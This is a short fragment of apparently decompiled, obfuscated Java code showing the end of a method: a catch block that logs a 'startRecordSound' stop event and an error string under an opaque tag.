        } catch (Exception e) {
            this.f533b.mo233d(this, "startRecordSound", "stop");
            StringBuilder sb6 = new StringBuilder();
            sb6.append("ERROR");
            sb6.append(e);
            this.f533b.mo213a("cpysnikhf", sb6.toString());
        }
    }
}
